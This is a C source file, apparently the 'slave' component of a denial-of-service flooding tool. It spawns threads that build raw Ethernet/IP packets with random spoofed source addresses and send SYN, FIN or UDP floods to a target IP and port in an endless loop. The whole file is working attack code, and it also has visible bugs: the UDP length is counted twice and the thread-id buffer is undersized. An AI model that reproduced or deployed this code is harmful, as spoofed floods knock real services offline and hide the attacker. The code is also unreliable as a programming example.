#include <stdio.h>
#include <stdlib.h>		// 
#include <unistd.h>		// write(), close()
#include <string.h>		// mem*()
#include <time.h>		// time()
#include <pthread.h>		// "pthread"
#include <sys/ioctl.h>		// ioctl()
#include <net/if.h>		// struct ifreq
#include <net/ethernet.h>	// struct ether_header
#include <netinet/ip.h>		// struct ip
#include <netinet/tcp.h>	// struct tcphdr
#include <netinet/udp.h>	// struct udphdr
#include <arpa/inet.h>		// inet
#include <netpacket/packet.h>	// struct sockaddr_ll

#include "slave.h"
#include "checksum.h"

#define UDP_PAYLOAD 1000

static struct SlaveTable head;

static void *startup(void *dst);
static struct SlaveTable *alloc_slave(const struct Flow * const flow, const pthread_t * const tid);


void rawprint(const uint8_t * const packet, int packetlen)
{
	printf("------- RAW -------\n");
	int i = 0;
	while( i < packetlen ) {
		printf("%02x ", *(packet+i));
		if( ++i%16 == 0 ) printf("\n");
	}
	if( i%16 != 0 ) printf("\n-------------------\n");
	else printf("-------------------\n");
}


bool slave_create(const struct Flow * const flow)
{
	struct SlaveTable *node = &head;
	int times = flow->times;
	pthread_t slave[times];
	pthread_attr_t attr;
	int i;

	while( node->next != NULL ) {
		node = node->next;
		if( memcmp(flow, &node->flow, sizeof(struct Flow)) == 0 ) {
			printf("Already Running\n");
			return false;
		}
	}

	pthread_attr_init(&attr);
	pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);

	for(i = 0; i < times; i++) {
		if( pthread_create(&slave[i], &attr, startup, (void *)flow) != 0 ) {
			perror("pthread_create(): ");
			return false;
		}
	}

	node->next = alloc_slave(flow, slave);
	if( node->next == NULL)
		return false;

	return true;
}

bool slave_delete(struct Flow *flow)
{
	struct SlaveTable *tmp, *node = &head;
	int size = sizeof(struct Flow);
	int times, i;

	while( node->next != NULL ) {
		if( memcmp(flow, &node->next->flow, size) == 0 ) {
			tmp = node->next;
			times = tmp->flow.times;

			for(i = 0; i < times; i++) {
				if( pthread_cancel(tmp->tid[i]) != 0 ) {
					perror("pthread_cancel(): ");
					return false;
				}
			}

			node->next = tmp->next;

			free(tmp->tid);
			free(tmp);

			return true;
		}

		node = node->next;
	}

	printf("Cannot Find\n");
	return false;
}

void slave_deleteall()
{
	struct SlaveTable *tmp, *node = &head;

	if( node->next == NULL )
		return;
	else
		node = node->next;

	do {
		tmp = node->next;
		free(node->tid);
		free(node);
		node = tmp;

	}while( node != NULL );
}

static void *startup(void *data)
{
	uint8_t packet[IP_MAXPACKET];
	struct ifreq ifr;
	struct sockaddr_ll sll;
	int sockfd, done = 0;

	int ethdrlen = sizeof(struct ether_header);
	int iphdrlen = sizeof(struct ip);
	int tcphdrlen = sizeof(struct tcphdr);
	int udphdrlen = sizeof(struct udphdr);
	int packetlen = ethdrlen + iphdrlen;
	int payloadlen = 0;

	struct Flow flow;
	struct ether_header *eth = (struct ether_header *)packet;
	struct ip *iphdr = (struct ip *)(packet + ethdrlen);
	struct tcphdr *tcphdr = (struct tcphdr *)((uint8_t *)iphdr + iphdrlen);
	struct udphdr *udphdr = (struct udphdr *)((uint8_t *)iphdr + iphdrlen);
	char *payload;

	//printf("%s %d %d %d\n", inet_ntoa(flow->ip), flow->port, flow->times, flow->type);
	memset(packet, 0, IP_MAXPACKET);
	memcpy(&flow, (struct Flow *)data, sizeof(struct Flow));

	/* Set Static Options */
	eth->ether_type = htons(ETHERTYPE_IP);

	iphdr->ip_hl = iphdrlen / sizeof(uint32_t); // 5
	iphdr->ip_v = 4;
	iphdr->ip_ttl = 128;
	memcpy(&iphdr->ip_dst, &flow.ip, sizeof(struct in_addr));

	if( flow.type == UDP ) {
		payload = (char *)packet + packetlen + udphdrlen;
		payloadlen = UDP_PAYLOAD;

		iphdr->ip_p = IPPROTO_UDP;
		udphdr->len = htons(udphdrlen + payloadlen);
		udphdr->dest = htons(flow.port);

		packetlen += udphdrlen + payloadlen;

		packetlen += sizeof(struct udphdr) + payloadlen;

	}else {
		payload = (char *)packet + packetlen + tcphdrlen;

		iphdr->ip_p = IPPROTO_TCP;
		tcphdr->dest = htons(flow.port);
		tcphdr->doff = tcphdrlen / 4;  // 5
		tcphdr->window = htons(8192);

		if( flow.type == SYN ) {
			memcpy(payload, "\x05\xb4\x01\x01\x04\x02", 6);
			payloadlen = 6;

			iphdr->ip_len = htons(iphdrlen + tcphdrlen + 6);
			tcphdr->syn = 1;
		}else {
			iphdr->ip_len = htons(iphdrlen + tcphdrlen);
			tcphdr->fin = 1;
		}

		packetlen += tcphdrlen + payloadlen;
	}

	/* SEND PACKET */
	srand(time(NULL) + pthread_self());

	/* Set Packet Options */
	if( (sockfd = socket(PF_PACKET, SOCK_RAW, IPPROTO_RAW)) < 0 ) {
		perror("socket(): ");
		return NULL;
	}

	memset(&ifr, 0, sizeof(struct ifreq));
	strncpy(ifr.ifr_name, "eth0", IFNAMSIZ-1);

	if( ioctl(sockfd, SIOCGIFINDEX, &ifr) < 0 ) {
		perror("ioctl(): ");
		close(sockfd);
		return NULL;
	}

	sll.sll_family = AF_PACKET;
	sll.sll_ifindex = ifr.ifr_ifindex;

	if( bind(sockfd, (struct sockaddr *)&sll, sizeof(sll)) < 0 ) {
		perror("bind(): ");
		close(sockfd);
		return NULL;
	}

	while( 1 ) {
		/* IP HEADER */
		iphdr->ip_id = rand();
		iphdr->ip_src.s_addr = rand();
		iphdr->ip_sum = 0;
		iphdr->ip_sum = checksum((uint16_t *)iphdr, iphdrlen);

		if( flow.type == UDP ) {
		/* UDP HEADER */
			udphdr->source = rand();
			udphdr->check = 0;
			udphdr->check = udp_checksum(iphdr, udphdr, payload, payloadlen);

		}else {
		/* TCP HEADER */
			tcphdr->source = rand();
			tcphdr->seq = rand();
			tcphdr->ack_seq = rand();
			tcphdr->check = 0;
			tcphdr->check = tcp_checksum(iphdr, tcphdr, payload, payloadlen);
		}

		//rawprint(packet, packetlen);

		/* SEND PACKET */
		if( (done = write(sockfd, packet, packetlen)) != packetlen )
			printf("Miss %d bytes\n", packetlen - done);

		sleep(1);
	}

	close(sockfd);
}

static struct SlaveTable *alloc_slave(const struct Flow * const flow, const pthread_t * const tid)
{
//	printf("--- alloc\n");
//	printf("%p / %p / %p / %p\n", &flow->ip, &flow->port, &flow->times, &flow->type);
//	printf("%s / %d / %d / %d\n", inet_ntoa(flow->ip), flow->port, flow->times, flow->type);

	struct SlaveTable *tmp = (struct SlaveTable *)malloc(sizeof(struct SlaveTable));
	if( tmp == NULL ) {
		perror("alloc_slave()/malloc()");
		return NULL;
	}

	tmp->tid = (pthread_t *)malloc(flow->times);
	if( tmp->tid == NULL ) {
		perror("alloc_slave()/malloc()");
		free(tmp);
		return NULL;
	}

	memcpy(tmp->tid, tid, flow->times * sizeof(pthread_t));
	memcpy(tmp, flow, sizeof(struct Flow));
	tmp->next = NULL;

	return tmp;
}
